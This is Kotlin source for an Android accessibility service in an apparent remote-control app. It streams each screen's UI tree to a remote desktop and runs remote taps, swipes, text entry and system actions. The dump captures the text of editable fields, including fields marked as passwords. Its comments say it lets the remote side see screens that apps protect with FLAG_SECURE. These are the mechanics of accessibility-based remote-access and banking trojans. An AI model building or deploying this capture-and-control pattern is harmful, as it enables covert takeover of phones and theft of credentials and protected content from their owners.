package com.remotectrl.service

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.GestureDescription
import android.content.Context
import android.graphics.Path
import android.graphics.Rect
import android.media.AudioManager
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.KeyEvent
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import androidx.annotation.RequiresApi
import org.json.JSONArray
import org.json.JSONObject

@RequiresApi(Build.VERSION_CODES.N)
class ControlAccessibilityService : AccessibilityService() {

    companion object {
        private const val TAG = "SecureControl"
        private var instance: ControlAccessibilityService? = null
        fun getInstance(): ControlAccessibilityService? = instance
    }

    private val uiHandler = Handler(Looper.getMainLooper())
    private val hierarchyRunnable = Runnable { dumpAndSendHierarchy() }

    private val screenWidth: Int  get() = resources.displayMetrics.widthPixels
    private val screenHeight: Int get() = resources.displayMetrics.heightPixels

    private var activePath: Path? = null
    private var gestureStartTime: Long = 0

    override fun onServiceConnected() {
        instance = this
        Log.i(TAG, "Service connecté — écran ${screenWidth}x${screenHeight}")
    }

    override fun onDestroy() {
        uiHandler.removeCallbacks(hierarchyRunnable)
        instance = null
        super.onDestroy()
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        when (event?.eventType) {
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                // Changement d'app/activité : envoyer immédiatement
                uiHandler.removeCallbacks(hierarchyRunnable)
                uiHandler.post(hierarchyRunnable)
            }
            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
                // Contenu modifié : debounce 400ms pour éviter le spam
                uiHandler.removeCallbacks(hierarchyRunnable)
                uiHandler.postDelayed(hierarchyRunnable, 400)
            }
        }
    }

    override fun onInterrupt() {}

    /**
     * Analyse la hiérarchie de la fenêtre active et l'envoie via Socket.IO.
     * Permet au support de "voir" l'interface même si l'écran est noirci (FLAG_SECURE).
     */
    private fun dumpAndSendHierarchy() {
        val mgr  = com.remotectrl.webrtc.WebRTCManager.getInstance(this)
        val root = rootInActiveWindow
        if (root == null) {
            // Écran inactif/verrouillé — on prévient quand même le desktop
            mgr.sendInternalEvent(JSONObject().apply {
                put("type",  "ui_hierarchy")
                put("error", "no_window")
                put("interactive", JSONArray())
            })
            Log.w(TAG, "rootInActiveWindow null — écran verrouillé ?")
            return
        }
        try {
            val interactive = JSONArray()
            extractInteractiveElements(root, interactive)

            val hierarchy = JSONObject().apply {
                put("type",        "ui_hierarchy")
                put("packageName", root.packageName)
                put("screenWidth", screenWidth)
                put("screenHeight",screenHeight)
                put("interactive", interactive)
                put("nodes",       parseNodes(root))
            }
            mgr.sendInternalEvent(hierarchy)
            Log.i(TAG, "Hiérarchie envoyée — ${interactive.length()} éléments interactifs")
        } catch (e: Exception) {
            Log.e(TAG, "Erreur dump hiérarchie: ${e.message}")
            mgr.sendInternalEvent(JSONObject().apply {
                put("type",  "ui_hierarchy")
                put("error", "exception:${e.message}")
                put("interactive", JSONArray())
            })
        } finally {
            root.recycle()
        }
    }

    /**
     * Parcourt récursivement l'arbre et collecte tous les champs éditables
     * et tous les boutons cliquables ayant un label visible.
     * Aucune permission supplémentaire — repose uniquement sur le service d'accessibilité.
     */
    private fun extractInteractiveElements(node: AccessibilityNodeInfo, result: JSONArray) {
        val bounds = Rect()
        node.getBoundsInScreen(bounds)
        if (bounds.isEmpty) {
            for (i in 0 until node.childCount) {
                val child = node.getChild(i) ?: continue
                extractInteractiveElements(child, result)
                child.recycle()
            }
            return
        }

        val cx = (bounds.left.toFloat() + bounds.right.toFloat())  / 2f / screenWidth
        val cy = (bounds.top.toFloat()  + bounds.bottom.toFloat()) / 2f / screenHeight

        when {
            node.isEditable -> {
                val hint = node.contentDescription?.toString()?.takeIf { it.isNotBlank() }
                    ?: (node.viewIdResourceName ?: "").substringAfterLast('/').replace('_', ' ')
                result.put(JSONObject().apply {
                    put("kind",    "field")
                    put("type",    if (node.isPassword) "password" else "text")
                    put("text",    node.text?.toString() ?: "")
                    put("hint",    hint)
                    put("id",      node.viewIdResourceName ?: "")
                    put("focused", node.isFocused)
                    put("cx", cx); put("cy", cy)
                })
                // Ne pas descendre dans les enfants d'un champ éditable
                return
            }
            node.isClickable && node.isEnabled -> {
                val label = (node.text?.toString()?.trim()
                    ?: node.contentDescription?.toString()?.trim() ?: "")
                    .take(60)
                if (label.isNotEmpty()) {
                    result.put(JSONObject().apply {
                        put("kind", "button")
                        put("text", label)
                        put("id",   node.viewIdResourceName ?: "")
                        put("cx", cx); put("cy", cy)
                    })
                }
                // Continuer la descente : un bouton peut contenir des champs
            }
        }

        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            extractInteractiveElements(child, result)
            child.recycle()
        }
    }

    private fun parseNodes(node: AccessibilityNodeInfo): JSONObject {
        val json = JSONObject()
        val bounds = Rect()
        node.getBoundsInScreen(bounds)

        json.put("text",      node.text?.toString() ?: "")
        json.put("desc",      node.contentDescription?.toString() ?: "")
        json.put("class",     node.className?.toString() ?: "")
        json.put("id",        node.viewIdResourceName ?: "")
        json.put("clickable", node.isClickable)
        json.put("editable",  node.isEditable)
        json.put("enabled",   node.isEnabled)
        json.put("scrollable",node.isScrollable)
        json.put("checked",   node.isChecked)
        json.put("focused",   node.isFocused)
        json.put("bounds", JSONObject().apply {
            put("left",   bounds.left.toFloat()   / screenWidth)
            put("top",    bounds.top.toFloat()    / screenHeight)
            put("right",  bounds.right.toFloat()  / screenWidth)
            put("bottom", bounds.bottom.toFloat() / screenHeight)
        })

        if (node.childCount > 0) {
            val children = JSONArray()
            for (i in 0 until node.childCount) {
                node.getChild(i)?.let { child ->
                    children.put(parseNodes(child))
                    child.recycle()
                }
            }
            json.put("children", children)
        }
        return json
    }

    // ──────────────────────────────────────────
    //  Traitement des commandes reçues du desktop
    // ──────────────────────────────────────────

    fun handleEvent(json: JSONObject) {
        when (json.optString("type")) {
            "touch"         -> handleTouch(json)
            "node_click"    -> handleNodeClick(json)
            "longpress"     -> handleLongPress(json)
            "scroll"        -> handleScroll(json)
            "pinch"         -> handlePinch(json)
            "text"          -> handleText(json)
            "field:set"     -> handleFieldSet(json)
            "key"           -> handleKey(json)
            "back"          -> performGlobalAction(GLOBAL_ACTION_BACK)
            "home"          -> performGlobalAction(GLOBAL_ACTION_HOME)
            "recents"       -> performGlobalAction(GLOBAL_ACTION_RECENTS)
            "notifications" -> performGlobalAction(GLOBAL_ACTION_NOTIFICATIONS)
            "quick:settings"-> performGlobalAction(GLOBAL_ACTION_QUICK_SETTINGS)
            "lock"          -> if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) performGlobalAction(GLOBAL_ACTION_LOCK_SCREEN)
            "screenshot"    -> if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) performGlobalAction(GLOBAL_ACTION_TAKE_SCREENSHOT)
            "screen:wake"   -> dispatchMediaKey(KeyEvent.KEYCODE_WAKEUP)
            "volume:up"     -> audioAdjust(AudioManager.ADJUST_RAISE)
            "volume:down"   -> audioAdjust(AudioManager.ADJUST_LOWER)
            "volume:mute"   -> audioAdjust(AudioManager.ADJUST_TOGGLE_MUTE)
            "media:play"    -> dispatchMediaKey(KeyEvent.KEYCODE_MEDIA_PLAY_PAUSE)
            "media:next"    -> dispatchMediaKey(KeyEvent.KEYCODE_MEDIA_NEXT)
            "media:prev"    -> dispatchMediaKey(KeyEvent.KEYCODE_MEDIA_PREVIOUS)
            "media:stop"    -> dispatchMediaKey(KeyEvent.KEYCODE_MEDIA_STOP)
            "refresh_ui"    -> {
                uiHandler.removeCallbacks(hierarchyRunnable)
                uiHandler.post(hierarchyRunnable)
            }
            else -> Log.w(TAG, "Événement inconnu: ${json.optString("type")}")
        }
    }

    // ──────────────────────────────────────────
    //  Touch : accumulation pour tap/swipe fluide
    // ──────────────────────────────────────────

    private fun handleTouch(json: JSONObject) {
        val x = (json.optDouble("x", 0.0) * screenWidth).toFloat()
        val y = (json.optDouble("y", 0.0) * screenHeight).toFloat()

        when (json.optString("action", "down")) {
            "down" -> {
                activePath = Path().apply { moveTo(x, y) }
                gestureStartTime = System.currentTimeMillis()
            }
            "move" -> activePath?.lineTo(x, y)
            "up"   -> {
                activePath?.lineTo(x, y)
                val duration = System.currentTimeMillis() - gestureStartTime
                val stroke = GestureDescription.StrokeDescription(activePath!!, 0, duration.coerceAtLeast(10))
                dispatchGesture(GestureDescription.Builder().addStroke(stroke).build(), null, null)
                activePath = null
            }
        }
    }

    private fun handleLongPress(json: JSONObject) {
        val x = (json.optDouble("x", 0.0) * screenWidth).toFloat()
        val y = (json.optDouble("y", 0.0) * screenHeight).toFloat()
        val path = Path().apply { moveTo(x, y) }
        dispatchGesture(
            GestureDescription.Builder()
                .addStroke(GestureDescription.StrokeDescription(path, 0, 800))
                .build(), null, null
        )
    }

    // ──────────────────────────────────────────
    //  Scroll et Pinch
    // ──────────────────────────────────────────

    private fun handleScroll(json: JSONObject) {
        val x  = (json.optDouble("x",  0.5) * screenWidth).toFloat()
        val y  = (json.optDouble("y",  0.5) * screenHeight).toFloat()
        val dx = json.optDouble("dx", 0.0).toFloat() * screenWidth
        val dy = json.optDouble("dy", 0.0).toFloat() * screenHeight
        val path = Path().apply { moveTo(x, y); lineTo(x + dx, y + dy) }
        dispatchGesture(
            GestureDescription.Builder()
                .addStroke(GestureDescription.StrokeDescription(path, 0L, 250L))
                .build(), null, null
        )
    }

    private fun handlePinch(json: JSONObject) {
        val x     = (json.optDouble("x", 0.5) * screenWidth).toFloat()
        val y     = (json.optDouble("y", 0.5) * screenHeight).toFloat()
        val scale = json.optDouble("scale", 1.0).toFloat()
        val off   = 200f
        val path1 = Path().apply { moveTo(x - off, y - off); lineTo(x - off * scale, y - off * scale) }
        val path2 = Path().apply { moveTo(x + off, y + off); lineTo(x + off * scale, y + off * scale) }
        dispatchGesture(
            GestureDescription.Builder()
                .addStroke(GestureDescription.StrokeDescription(path1, 0, 400))
                .addStroke(GestureDescription.StrokeDescription(path2, 0, 400))
                .build(), null, null
        )
    }

    // ──────────────────────────────────────────
    //  Clic via nœud d'accessibilité (ACTION_CLICK)
    // ──────────────────────────────────────────

    private fun handleNodeClick(json: JSONObject) {
        val x = (json.optDouble("x", 0.5) * screenWidth).toInt()
        val y = (json.optDouble("y", 0.5) * screenHeight).toInt()

        val root = rootInActiveWindow ?: return
        try {
            val node = findNodeAt(root, x, y) ?: return
            // Remonter au premier ancêtre cliquable
            var target = node
            while (!target.isClickable) {
                val parent = target.parent ?: break
                if (target !== node) target.recycle()
                target = parent
            }
            target.performAction(AccessibilityNodeInfo.ACTION_CLICK)
            Log.i(TAG, "Click node: ${target.className} text=${target.text}")
            if (target !== node) target.recycle()
        } finally {
            root.recycle()
        }
    }

    /**
     * Retourne le nœud le plus profond contenant (x, y).
     * Tous les nœuds intermédiaires non retournés sont recyclés.
     * Le nœud retourné (et root s'il est retourné) doit être recyclé par l'appelant.
     */
    private fun findNodeAt(root: AccessibilityNodeInfo, x: Int, y: Int): AccessibilityNodeInfo? {
        val bounds = Rect()
        root.getBoundsInScreen(bounds)
        if (!bounds.contains(x, y)) return null

        for (i in 0 until root.childCount) {
            val child = root.getChild(i) ?: continue
            val result = findNodeAt(child, x, y)
            if (result != null) {
                if (result !== child) child.recycle()
                return result
            }
            child.recycle()
        }
        return root
    }

    // ──────────────────────────────────────────
    //  Saisie clavier PC → AJOUTE au champ focalisé
    // ──────────────────────────────────────────

    private fun handleText(json: JSONObject) {
        val content = json.optString("content", "")
        if (content.isEmpty()) return
        val root = rootInActiveWindow ?: return
        try {
            val target = root.findFocus(AccessibilityNodeInfo.FOCUS_INPUT) ?: return
            try {
                val current = target.text?.toString() ?: ""
                val args = Bundle().apply {
                    putCharSequence(
                        AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE,
                        current + content,
                    )
                }
                if (!target.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args)) {
                    Log.w(TAG, "ACTION_SET_TEXT (append) échoué pour ${target.className}")
                }
            } finally {
                target.recycle()
            }
        } finally {
            root.recycle()
        }
    }

    // ──────────────────────────────────────────
    //  Envoi depuis panel quick-action → REMPLACE le champ
    // ──────────────────────────────────────────

    private fun handleFieldSet(json: JSONObject) {
        val content = json.optString("content", "")
        val root = rootInActiveWindow ?: return
        try {
            // Priorité : champ ciblé par coordonnées (cx/cy du nœud extrait)
            var target: AccessibilityNodeInfo? = null
            if (json.has("x") && json.has("y")) {
                val x = (json.optDouble("x") * screenWidth).toInt()
                val y = (json.optDouble("y") * screenHeight).toInt()
                target = findEditableAt(root, x, y)
            }
            // Fallback : champ qui a le focus
            if (target == null) {
                target = root.findFocus(AccessibilityNodeInfo.FOCUS_INPUT)
            }

            target?.let { node ->
                try {
                    val args = Bundle().apply {
                        putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, content)
                    }
                    if (!node.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args)) {
                        Log.w(TAG, "ACTION_SET_TEXT (field:set) échoué pour ${node.className}")
                    }
                } finally {
                    node.recycle()
                }
            }
        } finally {
            root.recycle()
        }
    }

    // Trouve le nœud éditable le plus profond aux coordonnées (x, y)
    private fun findEditableAt(root: AccessibilityNodeInfo, x: Int, y: Int): AccessibilityNodeInfo? {
        val bounds = Rect()
        root.getBoundsInScreen(bounds)
        if (!bounds.contains(x, y)) return null

        for (i in 0 until root.childCount) {
            val child = root.getChild(i) ?: continue
            val result = findEditableAt(child, x, y)
            if (result != null) {
                if (result !== child) child.recycle()
                return result
            }
            child.recycle()
        }
        return if (root.isEditable) root else null
    }

    // ──────────────────────────────────────────
    //  Touches clavier (backspace / enter)
    // ──────────────────────────────────────────

    private fun handleKey(json: JSONObject) {
        val keyCode = json.optString("keyCode")
        val root = rootInActiveWindow ?: return
        try {
            val focused = root.findFocus(AccessibilityNodeInfo.FOCUS_INPUT) ?: return
            try {
                when (keyCode) {
                    "backspace" -> {
                        val current = focused.text ?: return
                        if (current.isNotEmpty()) {
                            val args = Bundle().apply {
                                putCharSequence(
                                    AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE,
                                    current.substring(0, current.length - 1)
                                )
                            }
                            focused.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args)
                        }
                    }
                    "enter" -> focused.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                }
            } finally {
                focused.recycle()
            }
        } finally {
            root.recycle()
        }
    }

    private fun audioAdjust(direction: Int) {
        val am = getSystemService(Context.AUDIO_SERVICE) as AudioManager
        am.adjustStreamVolume(AudioManager.STREAM_MUSIC, direction, AudioManager.FLAG_SHOW_UI)
    }

    private fun dispatchMediaKey(keyCode: Int) {
        val am = getSystemService(Context.AUDIO_SERVICE) as AudioManager
        am.dispatchMediaKeyEvent(KeyEvent(KeyEvent.ACTION_DOWN, keyCode))
        am.dispatchMediaKeyEvent(KeyEvent(KeyEvent.ACTION_UP,   keyCode))
    }
}
